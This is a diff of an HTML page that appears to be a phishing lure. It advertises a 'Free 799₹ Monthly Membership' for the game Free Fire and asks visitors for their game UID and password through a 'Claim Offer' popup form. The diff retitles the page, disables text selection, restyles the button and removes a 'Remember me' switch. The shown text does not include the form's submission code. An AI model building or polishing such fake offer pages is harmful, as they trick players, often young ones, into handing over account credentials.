@@ -3,9 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Custom Offer Square</title>
+    <title>Offer Station</title>
     <style>
         body {
+             -webkit-user-select: none; /* Safari */
+              -ms-user-select: none; /* IE 10 and IE 11 */
+              user-select: none; /* Standard syntax */
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -18,7 +21,7 @@
         .offer-container {
             position: relative;
             width: 90vw;
-            height: 25vh;
+            height: 30vh;
             background: linear-gradient(135deg, #6e8efb, #a777e3);
             border-radius: 15px;
             box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
@@ -32,11 +35,10 @@
         }
         
         .offer-image {
-            width: 150px;
+            width: 200px;
             height: 150px;
-            object-fit: unset;
+            object-fit: contain;
             border-radius: 10px;
-            border: 3px solid white;
         }
         
         .offer-title {
@@ -48,8 +50,8 @@
         }
         
         .offer-button {
-            background-color: #ff6b6b;
-            color: white;
+            background-color: #FFD000;
+            color: #282828;
             border: none;
             padding: 12px 25px;
             border-radius: 30px;
@@ -150,72 +152,22 @@
         
         .close-button {
             position: absolute;
-            top: 15px;
-            right: 15px;
+            top: 30px;
+            right: 30px;
             background: none;
             border: none;
             font-size: 20px;
             cursor: pointer;
-            color: #777;
+            color: red;
         }
         
-        .switch-container {
-            display: flex;
-            align-items: center;
-            margin-top: 15px;
-        }
-        
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 50px;
-            height: 24px;
-            margin-right: 10px;
-        }
-        
-        .switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #ccc;
-            transition: .4s;
-            border-radius: 24px;
-        }
-        
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 16px;
-            width: 16px;
-            left: 4px;
-            bottom: 4px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-        }
-        
-        input:checked + .slider {
-            background-color: #6e8efb;
-        }
-        
-        input:checked + .slider:before {
-            transform: translateX(26px);
-        }
+
     </style>
 </head>
 <body>
     <div class="offer-container">
-        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnNrvRsiciixdEeGguPYi4stuRhvSGdy-4b3__ssrAfPhXoH5HETiXSnAzpOT38X92Lyz8z8bP_yuaoKZO9CHkM7dmggiXqYiChxUzWo-txr3hkEWNP1LhSz5S6n5OmUnpIHPKAGJ4Y-94Nyg9kuRnvfjbg4jk7W4af38W3ymbVaCkt4mTDnUnGiqbeYk/s4096/Picsart_25-05-28_22-48-54-761.png" alt="Special Offer" class="offer-image">
-        <h2 class="offer-title">Exclusive Offer For You!</h2>
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnNrvRsiciixdEeGguPYi4stuRhvSGdy-4b3__ssrAfPhXoH5HETiXSnAzpOT38X92Lyz8z8bP_yuaoKZO9CHkM7dmggiXqYiChxUzWo-txr3hkEWNP1LhSz5S6n5OmUnpIHPKAGJ4Y-94Nyg9kuRnvfjbg4jk7W4af38W3ymbVaCkt4mTDnUnGiqbeYk/s320/Picsart_25-05-28_22-48-54-761.png" alt="Special Offer" class="offer-image">
+        <h2 class="offer-title">Free 799₹ Monthly Membership Free Fire</h2>
         <button class="offer-button" id="claimButton">Claim Offer</button>
     </div>
     
@@ -225,7 +177,7 @@
             <h2 class="popup-title">Claim Your Offer</h2>
             <form id="claimForm">
                 <div class="form-group">
-                    <label for="uid">User ID</label>
+                    <label for="uid">Free Fire</label>
                     <input type="text" id="uid" placeholder="Enter your UID" required>
                 </div>
                 <div class="form-group">
@@ -236,14 +188,8 @@
                     <label for="password">Password</label>
                     <input type="password" id="password" placeholder="Enter password" required>
                 </div>
-                <div class="switch-container">
-                    <label class="switch">
-                        <input type="checkbox" id="rememberMe">
-                        <span class="slider"></span>
-                    </label>
-                    <label for="rememberMe">Remember me</label>
-                </div>
-                <button type="submit" class="submit-button">Submit</button>
+
+                <button type="submit" class="submit-button">Get</button>
             </form>
         </div>
     </div>
